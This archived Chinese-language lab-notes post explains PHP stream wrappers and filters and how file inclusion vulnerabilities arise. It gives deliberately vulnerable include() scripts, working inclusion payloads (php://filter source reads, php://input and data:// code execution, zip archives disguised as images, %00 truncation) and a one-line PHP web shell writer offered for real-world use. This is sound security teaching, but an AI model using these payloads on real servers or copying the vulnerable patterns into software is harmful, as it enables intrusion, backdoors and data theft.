---
title: "PHP Stream Wrappers and File Inclusion"
title_zh: "PHP 封装协议与文件包含：条件、示例与边界"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: PHP Protocols and File Inclusion Vulnerabilities
date: 2020-05-25 00:25:00
slug: PHP-Protocols-and-File-Inclusion-Vulnerabilities
permalink: writing/PHP-Protocols-and-File-Inclusion-Vulnerabilities/
topic: Code auditing
summary: "Comparing wrappers, filters and configuration-dependent behavior through local examples."
summary_zh: "系统梳理 PHP 封装协议和过滤器，比较相关配置对读取与包含行为的影响，配合本地实验说明数据流、编码转换及文件包含成因，并保留参考资料。"
format_label: Lab notes
featured_rank: 4
missing_images: 15
withheld_images: 0
recovered_images: 0
tags: Vulnerabilities
---

## 0x01 PHP伪协议

PHP伪协议事实上是其支持的协议与封装协议，会多次出现在CTFweb题中，并且有很多妙用。

PHP中支持的协议种类一共有12种:
[file](https://www.php.net/manual/zh/wrappers.file.php)、[http](https://www.php.net/manual/zh/wrappers.http.php)、[ftp](https://www.php.net/manual/zh/wrappers.ftp.php)、[php](https://www.php.net/manual/zh/wrappers.php.php)、[zlib](https://www.php.net/manual/zh/wrappers.zlib.php)、[data](https://www.php.net/manual/zh/wrappers.data.php)、[glob](https://www.php.net/manual/zh/wrappers.glob.php)、[phar](https://www.php.net/manual/zh/wrappers.phar.php)、[ssh2](https://www.php.net/manual/zh/wrappers.ssh2.php)、[rar](https://www.php.net/manual/zh/wrappers.rar.php)、[ogg](https://www.php.net/manual/zh/wrappers.ogg.php)、[expect](https://www.php.net/manual/zh/wrappers.expect.php)

```php
file://    — 访问本地文件系统
http://    — 访问 HTTP(s) 网址
ftp://     — 访问 FTP(s) URLs
php://     — 访问各个输入/输出流（I/O streams）
zlib://    — 压缩流
data://    — 数据（RFC 2397）
glob://    — 查找匹配的文件路径模式
phar://    — PHP 归档
ssh2://    — Secure Shell 2
rar://     — RAR
ogg://     — 音频流
expect://  — 处理交互式的流
```

### 0x001 file://协议

PHP.ini：

**file:// 协议在双off的情况下也可以正常使用:**

> allow_url_fopen ：off/on
>
> allow_url_include：off/on

**file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响**

**实例**

新建cmd.php

````php
<?php
$page=$_GET['file'];
if(isset($page)){
	include($page);
}
?>
````

payload:

*file://{文件的绝对路径和文件名}*

```http
http://127.0.0.1/cmd.php?file=file://C:/lab/www/phpinfo.php
```

即可读取.

### 0x002 php://协议

条件：

> 不需要开启allow_url_fopen
>
> 仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。

应用：

>php:// 访问各个输入/输出流（I/O streams）
>
>在CTF中经常使用的是php://filter和php://input
>
>php://filter用于读取源码
>
>php://input用于执行php代码

`php://stdin`是只读的

`php://stdout` 和 `php://stderr` 是只写的。

#### php://stdin

打开一个文件指针进行读取``fopen('php://stdin','r')``

#### php://stdout

打开一个文件指针进行写入`fopen('php://stdout', 'w');`

####  php://stderr

打开一个文件指针进行写入` fopen( 'php://stderr', 'w' );`

#### php://filter

**注:**

**php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。**

PHP.ini：

php://filter在双off的情况下也可以正常使用；

> allow_url_fopen ：off/on
>
> allow_url_include：off/on



`php://filter` 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。

|           名称            |                             描述                             |
| :-----------------------: | :----------------------------------------------------------: |
| resource=<要过滤的数据流> |       这个参数是必须的。它指定了你要筛选过滤的数据流。       |
|   read=<读链的筛选列表>   | 该参数可选。可以设定一个或多个过滤器名称，以管道符 （ \| ）分隔。 |
|  write=<写链的筛选列表>   | 该参数可选。可以设定一个或多个过滤器名称，以管道符（ \| ）分隔。 |
|    <;两个链的筛选列表>    | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |



**可以运用多种过滤器（字符串/转换/压缩/加密）**
例如平时我们用来**任意文件读取**的payload

```php
php://filter/read=convert.base64-encode/resource=upload.php
这里读的过滤器为convert.base64-encode,把输入流进行base64编码
resource=upload.php，代表读取upload.php的内容
```

payload:

```http
http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php
```

![历史配图暂缺](redacted-image:missing)

![历史配图暂缺](redacted-image:missing)

```http
http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
```

![历史配图暂缺](redacted-image:missing)

**灵活使用**

php://filter/read=<读取链需要应用的过滤器列表>

```http
http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode|string.toupper|string.rot14/resource=phpinfo.php
```

#### php://input

**php://input可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。** 

`php://input` 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 `php.ini` 指令。
**注：enctype=”multipart/form-data” 的时候 `php://input` 是无效的。**

**PHP.ini：**

> allow_url_fopen ：off/on
>
> allow_url_include：on

payload:

```http
https://lab.example.invalid/cmd.php?file=php://input
同时POST：file=<?php phpinfo(); ?>
```

![历史配图暂缺](redacted-image:missing)

需要注意:

- 测试过程中必须要开启allow_url_include，否则会报错
- 非测试状态下则需要关闭，否则造成任意代码执行

**实战中也可以POST如下内容生成一句话：**

```php
<?php fputs(fopen(“shell.php”,”w”),’<?php eval($_POST["cmd"];?>’);?>
```

#### php://output

`php://output` 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。

payload:

```http
https://lab.example.invalid/read.php?file=php://output
```

read.php

```php
<?php  
$test=$_GET['file'];file_put_contents($test,'this is test')
?> 
```

![历史配图暂缺](redacted-image:missing)

#### **过滤器**

过滤器有很多种，有字符串过滤器、转换过滤器、压缩过滤器、加密过滤器

|       名称        |                             描述                             |
| :---------------: | :----------------------------------------------------------: |
|   string.rot13    |                        进行rot13转换                         |
|  string.toupper   |                        将字符全部大写                        |
|  string.tolower   |                        将字符全部小写                        |
| string.strip_tags | 去除空字符、HTML 和 PHP 标记后的结果，
功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式 |

**举例**

```php
<?php
    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'string.rot13');
    echo "rot13:";
    fwrite($fp, "This is a test.\n");
    fclose($fp);

    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'string.toupper');
    echo "Upper:";
    fwrite($fp, "This is a test.\n");
    fclose($fp);

    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'string.tolower');
    echo "Lower:";
    fwrite($fp, "This is a test.\n");
    fclose($fp);

    $fp = fopen('php://output', 'w');
    echo "Del1:";
    stream_filter_append($fp, 'string.strip_tags', STREAM_FILTER_WRITE);
    fwrite($fp, "<b>This is a test.</b>!!!!<h1>~~~~</h1>\n");
    fclose($fp);

    $fp = fopen('php://output', 'w');
    echo "Del2:";
    stream_filter_append($fp, 'string.strip_tags', STREAM_FILTER_WRITE, "<b>");
    fwrite($fp, "<b>This is a test.</b>!!!!<h1>~~~~</h1>\n");
    fclose($fp);

    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'string.strip_tags', STREAM_FILTER_WRITE, array('b','h1'));
    echo "Del3:";
    fwrite($fp, "<b>This is a test.</b>!!!!<h1>~~~~</h1>\n");
    fclose($fp);
?>
```

![历史配图暂缺](redacted-image:missing)

#### 转换过滤器

**convert.base64-encode & convert.base64-decode**

> base64 编码解码
> convert.base64-encode和convert.base64-decode使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 convert.base64-encode支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用 line-length个字符为长度而截成块。如果给出了 line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再加上 chunk_split()相同。

**convert.quoted-printable-encode & convert.quoted-printable-decode **

> quoted-printable 编码解码
> convert.quoted-printable-encode和 convert.quoted-printable-decode等同于用 quoted_printable_decode()函数处理所有的流数据。没有和 convert.quoted-printable-encode相对应的函数。 convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数 binary和 force-encode-first。 convert.base64-decode只支持 line-break-chars参数作为从编码载荷中剥离的类型提示。

**举例**

```php
<?php
    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'convert.base64-encode');
    echo "base64-encode:";
    fwrite($fp, "This is a test.\n");
    fclose($fp);

    $param = array('line-length' => 8, 'line-break-chars' => "\n");
    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'convert.base64-encode', STREAM_FILTER_WRITE, $param);
    echo "\nbase64-encode-split:\n";
    fwrite($fp, "This is a test.\n");
    fclose($fp);

    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'convert.base64-decode');
    echo "\nbase64-decode:";
    fwrite($fp, "VGhpcyBpcyBhIHRlc3QuCg==\n");
    fclose($fp);

    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'convert.quoted-printable-encode');
    echo "quoted-printable-encode:";
    fwrite($fp, "This is a test.\n");
    fclose($fp);

    $fp = fopen('php://output', 'w');
    stream_filter_append($fp, 'convert.quoted-printable-decode');
    echo "\nquoted-printable-decode:";
    fwrite($fp, "This is a test.=0A");
    fclose($fp);
?>
```

![历史配图暂缺](redacted-image:missing)

#### 压缩过滤器

**zlib.deflate和 zlib.inflate**

> zlib.deflate（压缩）和 zlib.inflate（解压）实现了定义与 » RFC 1951的压缩算法。 deflate过滤器可以接受以一个关联数组传递的最多三个参数。 level定义了压缩强度（1-9）。数字更高通常会产生更小的载荷，但要消耗更多的处理时间。存在两个特殊压缩等级：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）。 window是压缩回溯窗口大小，以二的次方表示。更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存，低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。目前默认的 window大小是 15。 memory用来指示要分配多少工作内存。合法的数值范围是从 1（最小分配）到 9（最大分配）。内存分配仅影响速度，不会影响生成的载荷的大小。
> Note: 因为最常用的参数是压缩等级，也可以提供一个整数值作为此参数（而不用数组）。

**bzip2.compress和 bzip2.decompress**

> bzip2.compress过滤器接受以一个关联数组给出的最多两个参数：blocks是从 1 到 9 的整数值，指定分配多少个 100K 字节的内存块作为工作区。 work是 0 到 250 的整数值，指定在退回到一个慢一些，但更可靠的算法之前做多少次常规压缩算法的尝试。调整此参数仅影响到速度，压缩输出和内存使用都不受此设置的影响。将此参数设为 0 指示 bzip 库使用内部默认算法。 bzip2.decompress过滤器仅接受一个参数，可以用普通的布尔值传递，或者用一个关联数组中的small单元传递。当small设为&true; 值时，指示 bzip 库用最小的内存占用来执行解压缩，代价是速度会慢一些。

#### 加密过滤器

_mcrypt.*_和 _mdecrypt.*_使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为_mcrypt.ciphername_，其中 ciphername是密码的名字，将被传递给 mcrypt_module_open()。有以下五个过滤器参数可用：


mcrypt 过滤器参数

|      参数      | 是否必须 |              默认值              |                     取值举例                      |      |      |
| :------------: | :------: | :------------------------------: | :-----------------------------------------------: | ---- | ---- |
|      mode      |   可选   |               cbc                |         cbc, cfb, ecb, nofb, ofb, stream          |      |      |
| algorithms_dir |   可选   | ini_get(‘mcrypt.algorithms_dir’) |               algorithms 模块的目录               |      |      |
|   modes_dir    |   可选   |   ini_get(‘mcrypt.modes_dir’)    |                 modes 模块的目录                  |      |      |
|       iv       |   必选   |               N/A                | 典型为 8，16 或 32 字节的二进制数据。根据密码而定 |      |      |
|      key       |   必选   |               N/A                | 典型为 8，16 或 32 字节的二进制数据。根据密码而定 |      |      |

**举例**

phpinfo.php

```php
<?php  
$filename=$_GET["a"];  
$data="test test";  
file_put_contents($filename, $data);  
?>  
```

[PHP file_put_contents() 函数](http://www.w3school.com.cn/php/func_filesystem_file_put_contents.asp)

payload：

```http
https://lab.example.invalid/phpinfo.php?a=php://filter/write=string.tolower/resource=test.php
```

![历史配图暂缺](redacted-image:missing)

以base64的方式显示:

方法一:

```php
<?php  
$filename=$_GET["a"];  
echo file_get_contents($filename);  
?>  
```

[PHP file_get_contents() 函数](http://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp)

```http
https://lab.example.invalid/phpinfo.php?a=php://filter/convert.base64-encode/resource=test.php
```

![历史配图暂缺](redacted-image:missing)

方法二：

```php
<?php  
$filename=$_GET['a'];
$data="test test";
include("$filename");
?>
```

```http
http://lab.example.invalid/phpinfo.php?a=php://filter/convert.base64-encode/resource=test.php
```

**双引号包含的变量$filename会被当作正常变量执行，而单引号包含的变量则会被当作字符串执行。**

```php
<?php  
$aa=1;
echo "$aa";
echo "<br>";
echo '$aa';
?>
```

![历史配图暂缺](redacted-image:missing)

### 0x003 data://协议

data:资源类型;编码,内容
数据流封装器
当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行

经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data://协议需要满足双on条件

> PHP.ini：
> data://协议必须双在on才能正常使用；
> allow_url_fopen ：on
> allow_url_include：on
> php 版本大于等于 php5.2

**实例**

```cmd.php
<?php
if(isset($_GET['file'])){
	include $_GET['file'];
}
?>
```

```http
http://lab.example.invalid/cmd.php?file=data://text/plain,<?php phpinfo()?>

http://lab.example.invalid/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

![历史配图暂缺](redacted-image:missing)

![历史配图暂缺](redacted-image:missing)

```http
http://lab.example.invalid/cmd.php?file=data:text/plain,<?php phpinfo()?>

http://lab.example.invalid/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

![历史配图暂缺](redacted-image:missing)

![历史配图暂缺](redacted-image:missing)

### 0x004 zip://, bzip2://, zlib://协议

PHP.ini：

> zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用:
> allow_url_fopen ：off/on
> allow_url_include：off/on

```
3个封装协议，都是直接打开压缩文件。
compress.zlib://file.gz - 处理的是 '.gz' 后缀的压缩包
compress.bzip2://file.bz2 - 处理的是 '.bz2' 后缀的压缩包
zip://archive.zip#dir/file.txt - 处理的是 '.zip' 后缀的压缩包里的文件
```

**zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。**

### 0x005 zip://协议

php 版本大于等于 php5.3.0
使用方法：
`zip://archive.zip#dir/file.txt`
**zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]**
**要用绝对路径+#(url编码,即为%23)**

**实例**

payload

```http
http://lab.example.invalid/cmd.php?file=zip:///www/wwwroot/lab.example.invalid/file.jpg%23phpinfo.txt
```

- 先创建一个phpinfo.txt文件,写入代码`<?php phpinfo();?>`  
- 再将这个文件压缩为file.zip进行上传
- **若报错或上传失败，则将file.zip重命名为file.jpg即可**

![历史配图暂缺](redacted-image:missing)

> 由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。

### 0x006 bzip2://协议

**使用方法：**

`compress.bzip2://file.bz2`

相对路径也可以

**实例**

用7-zip生成一个bz2压缩文件。

```http
http://lab.example.invalid/cmd.php?file=compress.bzip2:///www/wwwroot/lab.example.invalid/file.jpg

or

http://lab.example.invalid/cmd.php?file=compress.bzip2://./file.jpg
```

### 0x007 zlib://协议

**使用方法：**

`compress.zlib://file.gz`


## 0x02 文件包含漏洞

### 0x001 文件包含漏洞简介

服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。

说白了就是引用一个文件。

### 0x002 文件包含函数

> 文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file 。

> 常见的文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file，

`include`和`require`区别主要是，`include`在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而`require`函数出现错误的时候，会直接报错并退出程序的执行。

而`include_once()`，`require_once()`这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。

### 0x003 漏洞产生原因

文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。

示例代码

```php
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

例如：

`$_GET['filename']`参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改`$_GET['filename']`的值，执行非预期的操作。

### 0x004 两种问题

**是否截断问题:**

情况一：不需要截断：

payload:

```http
http://127.0.0.1/test.php?file=file:///c:/lab/fixture/flag.txt
```

test.php
```php
<?php
include($_GET['file'])
?>
```

情况二：需要截断：

在php版本<=5.2中进行测试是可以使用%00截断的。

payload:

```http
http://127.0.0.1/test.php?file=file:///c:/lab/fixture/flag.txt%00
```

test.php
```php
<?php
include($_GET['file'].’.php’)
?>
```


**allow_url_fopen与allow_url_include是否开启问题**


则追溯于以上的各种相关协议



## 0x03 参考
[php 伪协议](https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&fps=1)

[php伪协议实现命令执行的七种姿势](http://www.freebuf.com/column/148886.html)

[Smi1e](https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/)

[Web安全实战系列：文件包含漏洞](https://www.freebuf.com/articles/web/182280.html)
